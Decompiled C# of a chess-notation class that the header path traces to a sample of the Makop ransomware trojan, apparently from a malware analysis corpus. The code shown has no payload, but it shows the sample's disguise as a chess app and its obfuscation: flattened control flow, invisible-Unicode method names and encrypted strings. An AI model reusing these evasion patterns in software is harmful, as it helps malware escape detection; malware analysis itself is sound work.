// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.Notation
// Assembly: Xe, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E8DDD59-A67B-4ABD-99CD-92D28751A620
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-2fdfbfc735f43a4e2dce0c849b41ab83dd17228f6df983f7a95d6e427cdc77b0.exe

using System.Runtime.InteropServices;

namespace SimpleChessApp.Game
{
  public class Notation
  {
    public Square from;
    public Square to;

    public string Move
    {
      get
      {
        string move = Notation.\u206A‎‪‎‎⁭‏‫‬‭‍⁮⁮‫‮⁪​‭‪‬‮​‮​‭​‭⁯⁮‍⁭⁯‏‎‌⁮⁭⁫‍‎‮(this.from.CurrentSquare, \u003CModule\u003E.\u200C⁪⁬‬⁪⁪⁬‭⁭⁫⁭⁪⁭⁪⁭‭‌⁭‎⁭‮⁬⁭‍​⁯‬⁫‌‮‎‫‏‬‭​​​⁮⁮‮<string>(124120720U), this.to.CurrentSquare);
label_1:
        int num1 = -1625524292;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1078483569)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * 1592715039 ^ -1366207025;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return move;
      }
    }

    public Notation(Square f, Square t, Board bo)
    {
label_1:
      int num1 = -1868112872;
      Square square1;
      Square square2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -504989946)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 955756470 ^ -1529158202;
            continue;
          case 3:
            square2 = new Square(f.File, f.Rank, bo);
            num1 = (int) num2 * 1608691995 ^ 293871909;
            continue;
          case 4:
            square1.Piece = new ChessPiece(t, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -1676216969 ^ 2107016164;
            continue;
          case 5:
            square1 = new Square(t.File, t.Rank, bo);
            square2.Piece = new ChessPiece(f, t.Piece.Kind, t.Piece.Color);
            num1 = (int) num2 * -1843190176 ^ -414511418;
            continue;
          case 6:
            num1 = (int) num2 * 1114491643 ^ 1863089467;
            continue;
          case 7:
            this.from = square2;
            num1 = (int) num2 * -1849212683 ^ -884619985;
            continue;
          case 8:
            num1 = (int) num2 * 1639324128 ^ -1171538928;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      this.to = square1;
    }

    public override string ToString()
    {
      string move = this.Move;
label_1:
      int num1 = -1304550825;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1353512646)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 231951856 ^ 886333071;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return move;
    }

    static string \u206A‎‪‎‎⁭‏‫‬‭‍⁮⁮‫‮⁪​‭‪‬‮​‮​‭​‭⁯⁮‍⁭⁯‏‎‌⁮⁭⁫‍‎‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
